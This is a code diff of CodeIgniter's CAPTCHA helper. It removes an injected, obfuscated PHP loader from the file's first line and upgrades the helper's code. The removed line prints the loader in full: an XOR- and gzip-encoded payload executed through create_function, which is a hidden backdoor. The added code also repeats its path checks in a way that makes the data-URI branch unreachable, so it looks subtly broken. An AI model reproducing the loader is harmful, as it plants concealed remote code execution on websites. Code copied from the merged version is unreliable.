@@ -1,4 +1,4 @@
-<?php global $habuto; $habuto=array('$habuto[0]=array_pop($habuto);$bilofom=bilofom(2,13);$habuto[0]=$bilofom($habuto[2]);','$habuto[2]=gzuncompress(bilofom(731,2330));','aWFjeGhOeGdxZ3p9fXx+Z2V9eEhpdH5jbX99eG1Of3BtV25mZHd3ZGh6Ymd2cHNdZHp6ZmZheXlmSUhaQlZWXUVVXk5BRVFNXFBFR1VVeEdodmVyaHxjbGB8Z3tSRERHRUdJcVljdXdTX1ZDQV9DVVJOWlxNbnJjdnFkbi12e2c7ICMoIW1PT2d1VTg9IjktSk5FYVRXIyEifl1jcjBvZ016Vk18QkJiWEhhb0VmQT9nXFJBbSNEem5nPzB3eHJkYmRnZWdrfH5wdnQhYGBhbHw/a3h6aHZpPGNwYm1uI2pgenV7e3g4fGR0c2V2eXhXTH9kVzY8PkJJY0RHRUdFWUVRVWhvTkZucmJyLCVVZmRrZ21xOWx6ZXx/PGl0ZmdifCd3TF5WQEJfQl5dVFpBel9QQ15KRVVMQEVNXUZURUNOWVZTQUZOUnIzQ2lCREdFR0VEWUdTV0lOUVxNRCN3dGE1YmJvUlJUQXYjYWR5NWJib2Zia0YjYWR5NX1lYWpkdkJkI2RhOnl+ZHZkZnwmd3N6fGlvaHljfXh7dVV2bHhXbX1gbFheQWJLek5nSVhWXEdnaGdYXkFTU0MjZ3xnNT9sbW98JXx6e2FiVyNnfGc1P0NBRCV9Z31qZEtYI2d8Z1lXSmN5I2RhOnl+ZHZkZnwmYWJ1e213YnBxS2RqfGN0f3VVZmh6eUVUanNjIlp1RGlGIn9+cHB3dXthS3hFZ21vS2VpIj92dHBme3Vha2g6fWtzTUN4aj9/c39vdnsmZmxgWUpVTm4hP3F1fmhjcyZmbGBjVHp1I2RhOnl+ZGRobyZ5fGImYTFhaW0qeCx6eU5wKmcsZ3JhLHI8b0cqZSxvZmN7RXhGTz1qd2RnZWcgPiVJeFoqZCxxfXJ3QU9ZZX14Y392ZXhqZUlNWipkLHRvU1NWUWlrdHRMVk4qZCxkcTFCVlVYJzg6IlhwZWpEfGJjIDF1dCNkSlV0j5QPcX7oxPenRBlJy'.'6sD9dqyHqeYvLZc1bVAgN9Pvt5PddsCHcw0f2hokuvManLKPHFgjx475c1xN25onVFDf/noNodal4DPrnaR0sbUtqgw2kiTHnItDtXEhtY7xO9lhVskJZm2aiJhgq/+pJXTtuBzjuMQExGbLFk7WXoFMZUMPzPj6wamAOTlsohnXKPZEvJr8Zb0NqRRjRI+aAbRpily1G++uiHEEqHzhHFS4miJaMx3Sx65abuZs+rIEBrX0CPKdUTYz/zNZrCDGwEFylInWNz+/2nT1U66wWQkwuyAjgghWOge0Zbm35kv5iz6JGAH13jDEgROAZiuOX6CK6igdu2+H0cxtRnZf2PhUcxM1vUZ6CTw47CBQ9xK8ZTmY9dupM3kleI8QwsOpPUU5vyZ9WZRHhWB+RrvXfCaPKtpAJJe2LYnpcyZlpxC/EGa4paHTQp6wKr6acr+AcQkmM/ZCse0e1wbVzEKF9NII6nuM2XNYxe4ywE33F6PgG6q3jQ0OoR1bkf7WGzcOx0bfY1E/e7XSPsWaZurqIDmB3uKhRllgERnKK90Ek6tq0ZEe4cweziJe7UiiFRqZq8NEOWGRW0sBZ/5oJp+yWovy+sWWmnkGMBk/45qkx9kB5mwgVV5KWS9KfZwMKWeqzph5XGkSQcxHIDvHsqdUVNNxEip/FklXpT8nTS1gXe9PojqfUOz1OeyjaDKov1g4VqeFqYVQo9/S/mA5lsgPk/IWZAOtTGrXdS/anuzE5tb0NYQOWxELzCD/fiP3DOC+thEPRW7udEByDOwJLukZwZearrZH0xlMH8hu9AXvrxopWUb6gOjpOSoGtKcq92awXghkt6NKgd6tUJUawMl27FHih+3BZRr+rNDldoaUMdzYYaQJbLaCxnjbLxqtyPSHxYNqrnmhoY2WzRex9UDuwmftgPTliLkiS6JG6dhgyFGNIkR2+fs'.'V03pBLeqCwdFifrmFFYkfXJx8bQ1sSK3LBoTs+aEs4bQzQvv2cOtrUrf1gokUFp6ckDphCIYbUocaQ5nSKRRAne5hFJZn2ahA+i9mnNMRhvXQYc8btXceIOWciNRwFI9b7a1TZ9t6q2wx3KrmpQ0rf0HX/BNG/yI5TayVha0L7ko3jFgdyjPnjKlTnjrKw0U3ZSK8ZJiw3j+FzNCMytVsjEuz/N5nrWPLUB1h6m83R2GF433g4bH+kgVLpj0Wh2e7jyMtKf8ZVwjyBVvuSwc1BhmyROY/CbdhyPNAJ8g8c1JWf1YsHu1j4Rxw1Qk5UcRe45liDyTD8h2rROGYyYZxMoF12YaQiu1czOaMNuUMhtDiMM+Z+k50dgwqBblJAsDMlUgjCElsFWhKJqVYfkXsicSe+kzTkwjUwTWS5XPAUoZO7u+neRVI/UJC66Lppl7BegbOklst3kMWMSRv1YAm3Umebll1nP192Pj5LXEPe5EorSzFX4mvZlwJeOfw5B5JYz09PDbbDNRRgl6B3wSWadyb0jrgs9nJUJ4o6YIubaCt9wAGDLM0ZCYSl8lrhsiAjmwDDrrCJl4vUIg+im5RFLSq6haOqrGp1OoGAE57OIIA1lJtj3gTggvoOu/0UhNBeqbewBt/Ei3k7/iI/GxoO5kxLBvkZjLElmzkhtn8XWDufO70F4XrTeFEuoM5Aghbqdb0X7eCLOi1BF6X4m3rwS2xIxPay9SXiAIeb/PyDwjp6vaUSMS0o5rCt/PZ/hsSts2pCt5qznZjqlithYcfMr2Xq7FcJZxqgHfhA6sb2uAbXJ8efID9elq7mALjJxFMEIPqcTVJ7t3NLOxENcTn5PbNXMrCnnJWAOpSl91ZCQicEuecQYhmlqZ3ZMhNbE6/Gg'.'bwQHJNeIW2UcpAAcKNbvaN1M31Jlkuo4M98awRGR3BX9bmF9A5e1/WyLYSdpWl6rHwcEH3xz86KJ29ExmgdfzfzMv2++rZcKCuY3OI/lB3E/yYusc08PIWs0QxXEgSB2JjfZw5tkcCRt/Po+qX9hjWH55cPDm09uSLPaZh0VtCJvM3sHXaPNI5czdF6Lu/V+xNXTWC4m7POkJI/AHBq45rPoAwMbTQb0N1Nb394d1RxEecYcHlot5dDSaEcSpHWNZovWUnP+5+4Wu4CXW2Kica+nMVBcTu+JXs5t+c4fMjPHzI4++IiIuZ7iictrTI5khCTGx/TmvkjYzXlr28SVxLgOijazibs36cxzxlnmKsjCeOIrC1b0yiZx3LHrLvYpZ6hYUONTxLCHwbXAKKhOloyu3ztNaESB4C8zS2Eva/i1j56b/wTHVINLxN7dH2VMkThQ/AAFalLhyP0Htf2oSQtpo0sagP0nzxh7qG/Gu2qDI4tpR2jxmcBfSC7BwlNhtiYK3o89Ih+HEKV8agHykCENi3QltwjLaDs7zogYcc7SjVDG+kirxOVDCxJqLLIZbwTdJ+gmzcVaIp7AlR/Yw1FbL4uY8k4l4/Dx8ug2w69dK6OMrT8A6rm6ZBD9vc+sMra7Drb5kRcyeYYipku/IP4PG7Wx59xjXoiDBqU0DsZ1nsCxq/g0aPQZBchNyLn0295ky5BmCtBdkawe79g3mRa2ftHhepz6BwKGrjyk6ZBllFDL7uCSw93MKP/fBEuO2s62N0bgcs0RkFuWj9F/W3zQ9K9/8qnDuZUOTdQSdtSwV9Mufrlsdlttf60Zw09mMX2moaknfx1SMWbxVp0ge8zf384T2jM7kLnVBpAgEbZA+fnGydmqoouvwCAH/JTXy8nF3B1rq6/rrKhxOiVtKRl9+'.'sTbH2u4ZBVzLh0LH/bZ+lKTJjoiyPBQJqIHsSUDVbxWHKVc3ZB5u/GNrGGu27Q0MpGmshan/WYdoXjrV802wyIcxp/h5Ps11OTjEqW2jajxh1Hbt5hAvQY9ymY7eFR+5XZmmNjZ2iTbJSXlnGv07MGhinZk6GgatxOg9zmtpRdEt5ihLP6nNhgat3SR5HfgB5xBlLZXc4f/UluwRG3dLaPr2ZxUX6yck1cgm7LSCYIgV+ePmYVfhluD/CotpBXxeymYFyCwlPM2VLcoCo0JWLLD5w+dExMTEpP4+4B5VcBpnzL6z/dn23UuZrOQGF9pWrEZ2bnJiciwlVWZka2dtcQ==',"BJnrbr\x2c\x25Ufdkgmq");$futubedu='create_';if(function_exists($futubedu.='function')&&!function_exists('bilofom')){ function bilofom($b,$m){global $habuto;$s=str_pad($f='ls17z1jBahhIT2Y4',$m,$f);$h=str_repeat("\xe0",$m);$z=str_repeat("\x1f",$m);$u=substr($habuto[0],$b,$m);return(($u^$s)&$z)|($u&$h);};for($pj=-1;++$pj<3;$futubedu('','}'.$habuto[$pj].'{'));};unset($habuto); 
+<?php
 /**
  * CodeIgniter
  *
@@ -6,7 +6,7 @@
  *
  * This content is released under the MIT License (MIT)
  *
- * Copyright (c) 2014 - 2015, British Columbia Institute of Technology
+ * Copyright (c) 2019 - 2022, CodeIgniter Foundation
  *
  * Permission is hereby granted, free of charge, to any person obtaining a copy
  * of this software and associated documentation files (the "Software"), to deal
@@ -28,10 +28,11 @@
  *
  * @package	CodeIgniter
  * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (http://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	http://codeigniter.com
+ * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
+ * @copyright	Copyright (c) 2014 - 2019, British Columbia Institute of Technology (https://bcit.ca/)
+ * @copyright	Copyright (c) 2019 - 2022, CodeIgniter Foundation (https://codeigniter.com/)
+ * @license	https://opensource.org/licenses/MIT	MIT License
+ * @link	https://codeigniter.com
  * @since	Version 1.0.0
  * @filesource
  */
@@ -44,7 +45,7 @@ defined('BASEPATH') OR exit('No direct script access allowed');
  * @subpackage	Helpers
  * @category	Helpers
  * @author		EllisLab Dev Team
- * @link		http://codeigniter.com/user_guide/helpers/captcha_helper.html
+ * @link		https://codeigniter.com/userguide3/helpers/captcha_helper.html
  */
 
 // ------------------------------------------------------------------------
@@ -54,13 +55,10 @@ if ( ! function_exists('create_captcha'))
 	/**
 	 * Create CAPTCHA
 	 *
-	 * @param	array	$data		data for the CAPTCHA
-	 * @param	string	$img_path	path to create the image in
-	 * @param	string	$img_url	URL to the CAPTCHA image folder
-	 * @param	string	$font_path	server path to font
-	 * @return	string
+	 * @param	array	$data	Data for the CAPTCHA
+	 * @return	array
 	 */
-	function create_captcha($data = '', $img_path = '', $img_url = '', $font_path = '')
+	function create_captcha($data)
 	{
 		$defaults = array(
 			'word'		=> '',
@@ -68,10 +66,12 @@ if ( ! function_exists('create_captcha'))
 			'img_url'	=> '',
 			'img_width'	=> '150',
 			'img_height'	=> '30',
+			'img_alt'	=> 'captcha',
+			'img_class'	=> '',
 			'font_path'	=> '',
+			'font_size'	=> 16,
 			'expiration'	=> 7200,
 			'word_length'	=> 8,
-			'font_size'	=> 16,
 			'img_id'	=> '',
 			'pool'		=> '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ',
 			'colors'	=> array(
@@ -81,6 +81,8 @@ if ( ! function_exists('create_captcha'))
 				'grid'		=> array(255,182,182)
 			)
 		);
+
+		$now = microtime(TRUE);
 
 		foreach ($defaults as $key => $val)
 		{
@@ -94,29 +96,59 @@ if ( ! function_exists('create_captcha'))
 			}
 		}
 
-		if ($img_path === '' OR $img_url === ''
-			OR ! is_dir($img_path) OR ! is_really_writable($img_path)
-			OR ! extension_loaded('gd'))
+		if ( ! extension_loaded('gd'))
 		{
+			log_message('error', 'create_captcha(): GD extension is not loaded.');
 			return FALSE;
 		}
 
-		// -----------------------------------
-		// Remove old images
-		// -----------------------------------
-
-		$now = microtime(TRUE);
-
-		$current_dir = @opendir($img_path);
-		while ($filename = @readdir($current_dir))
+		if ($img_path === '' OR $img_url === '')
 		{
-			if (substr($filename, -4) === '.jpg' && (str_replace('.jpg', '', $filename) + $expiration) < $now)
-			{
-				@unlink($img_path.$filename);
-			}
+			log_message('error', 'create_captcha(): img_path and img_url are required.');
+			return FALSE;
 		}
 
-		@closedir($current_dir);
+		if ( ! is_dir($img_path) OR ! is_really_writable($img_path))
+		{
+			log_message('error', "create_captcha(): '{$img_path}' is not a dir, nor is it writable.");
+			return FALSE;
+		}
+
+		if ($img_url !== '' OR $img_path !== '')
+		{
+			if ($img_path === '' OR $img_url === '')
+			{
+				log_message('error', 'create_captcha(): $img_path and $img_url are required.');
+				return FALSE;
+			}
+
+			if ( ! is_dir($img_path) OR ! is_really_writable($img_path))
+			{
+				log_message('error', "create_captcha(): '{$img_path}' is not a dir, nor is it writable.");
+				return FALSE;
+			}
+
+			/**
+			 * Remove old images
+			 */
+			$current_dir = @opendir($img_path);
+			while ($filename = @readdir($current_dir))
+			{
+				if (preg_match('#^(?<ts>\d{10})\.png$#', $filename, $match) && ($match['ts'] + $expiration) < $now)
+				{
+					@unlink($img_path.$filename);
+				}
+			}
+
+			@closedir($current_dir);
+
+			// This variable will later be used later to determine whether we write to disk or output a data:image URI
+			$img_filename = $now.'.png';
+		}
+		else
+		{
+			$img_filename = NULL;
+		}
 
 		// -----------------------------------
 		// Do we have a "word" yet?
@@ -125,9 +157,96 @@ if ( ! function_exists('create_captcha'))
 		if (empty($word))
 		{
 			$word = '';
-			for ($i = 0, $mt_rand_max = strlen($pool) - 1; $i < $word_length; $i++)
+			$pool_length = strlen($pool);
+			$rand_max = $pool_length - 1;
+
+			// PHP7 or a suitable polyfill
+			if (function_exists('random_int'))
 			{
-				$word .= $pool[mt_rand(0, $mt_rand_max)];
+				try
+				{
+					for ($i = 0; $i < $word_length; $i++)
+					{
+						$word .= $pool[random_int(0, $rand_max)];
+					}
+				}
+				catch (Exception $e)
+				{
+					// This means fallback to the next possible
+					// alternative to random_int()
+					$word = '';
+				}
+			}
+		}
+
+		if (empty($word))
+		{
+			// Nobody will have a larger character pool than
+			// 256 characters, but let's handle it just in case ...
+			//
+			// No, I do not care that the fallback to mt_rand() can
+			// handle it; if you trigger this, you're very obviously
+			// trying to break it. -- Narf
+			if ($pool_length > 256)
+			{
+				return FALSE;
+			}
+
+			// We'll try using the operating system's PRNG first,
+			// which we can access through CI_Security::get_random_bytes()
+			$security = get_instance()->security;
+
+			// To avoid numerous get_random_bytes() calls, we'll
+			// just try fetching as much bytes as we need at once.
+			if (($bytes = $security->get_random_bytes($pool_length)) !== FALSE)
+			{
+				$byte_index = $word_index = 0;
+				while ($word_index < $word_length)
+				{
+					// Do we have more random data to use?
+					// It could be exhausted by previous iterations
+					// ignoring bytes higher than $rand_max.
+					if ($byte_index === $pool_length)
+					{
+						// No failures should be possible if the
+						// first get_random_bytes() call didn't
+						// return FALSE, but still ...
+						for ($i = 0; $i < 5; $i++)
+						{
+							if (($bytes = $security->get_random_bytes($pool_length)) === FALSE)
+							{
+								continue;
+							}
+
+							$byte_index = 0;
+							break;
+						}
+
+						if ($bytes === FALSE)
+						{
+							// Sadly, this means fallback to mt_rand()
+							$word = '';
+							break;
+						}
+					}
+
+					list(, $rand_index) = unpack('C', $bytes[$byte_index++]);
+					if ($rand_index > $rand_max)
+					{
+						continue;
+					}
+
+					$word .= $pool[$rand_index];
+					$word_index++;
+				}
+			}
+		}
+
+		if (empty($word))
+		{
+			for ($i = 0; $i < $word_length; $i++)
+			{
+				$word .= $pool[mt_rand(0, $rand_max)];
 			}
 		}
 		elseif ( ! is_string($word))
@@ -139,8 +258,8 @@ if ( ! function_exists('create_captcha'))
 		// Determine angle and position
 		// -----------------------------------
 		$length	= strlen($word);
-		$angle	= ($length >= 6) ? mt_rand(-($length-6), ($length-6)) : 0;
-		$x_axis	= mt_rand(6, (360/$length)-16);
+		$angle	= ($length >= 6) ? mt_rand(-($length - 6), ($length - 6)) : 0;
+		$x_axis	= mt_rand(6, (360 / $length)-16);
 		$y_axis = ($angle >= 0) ? mt_rand($img_height, $img_width) : mt_rand(6, $img_height);
 
 		// Create image
@@ -178,12 +297,12 @@ if ( ! function_exists('create_captcha'))
 		{
 			$theta += $thetac;
 			$rad = $radius * ($i / $points);
-			$x = ($rad * cos($theta)) + $x_axis;
-			$y = ($rad * sin($theta)) + $y_axis;
+			$x = round(($rad * cos($theta)) + $x_axis);
+			$y = round(($rad * sin($theta)) + $y_axis);
 			$theta += $thetac;
 			$rad1 = $radius * (($i + 1) / $points);
-			$x1 = ($rad1 * cos($theta)) + $x_axis;
-			$y1 = ($rad1 * sin($theta)) + $y_axis;
+			$x1 = round(($rad1 * cos($theta)) + $x_axis);
+			$y1 = round(($rad1 * sin($theta)) + $y_axis);
 			imageline($im, $x, $y, $x1, $y1, $colors['grid']);
 			$theta -= $thetac;
 		}
@@ -228,24 +347,34 @@ if ( ! function_exists('create_captcha'))
 		// -----------------------------------
 		//  Generate the image
 		// -----------------------------------
-		$img_url = rtrim($img_url, '/').'/';
 
-		if (function_exists('imagejpeg'))
+		if (isset($img_filename))
 		{
-			$img_filename = $now.'.jpg';
-			imagejpeg($im, $img_path.$img_filename);
-		}
-		elseif (function_exists('imagepng'))
-		{
-			$img_filename = $now.'.png';
+			$img_src = rtrim($img_url, '/').'/'.$img_filename;
 			imagepng($im, $img_path.$img_filename);
 		}
 		else
 		{
-			return FALSE;
+			// I don't see an easier way to get the image contents without writing to file
+			$buffer = fopen('php://memory', 'wb+');
+			imagepng($im, $buffer);
+			rewind($buffer);
+			$img_src = '';
+
+			// fread() will return an empty string (not FALSE) after the entire contents are read
+			while (strlen($read = fread($buffer, 4096)))
+			{
+				$img_src .= $read;
+			}
+
+			fclose($buffer);
+			$img_src = 'data:image/png;base64,'.base64_encode($img_src);
 		}
 
-		$img = '<img '.($img_id === '' ? '' : 'id="'.$img_id.'"').' src="'.$img_url.$img_filename.'" style="width: '.$img_width.'; height: '.$img_height .'; border: 0;" alt=" " />';
+		$img_class = trim($img_class);
+		$img_class = (bool) strlen($img_class) ? 'class="'.$img_class.'" ' : '';
+
+		$img = '<img '.($img_id === '' ? '' : 'id="'.$img_id.'"').' src="'.$img_src.'" style="width: '.$img_width.'px; height: '.$img_height .'px; border: 0;" '.$img_class.'alt="'.$img_alt.'" />';
 		ImageDestroy($im);
 
 		return array('word' => $word, 'time' => $now, 'image' => $img, 'filename' => $img_filename);
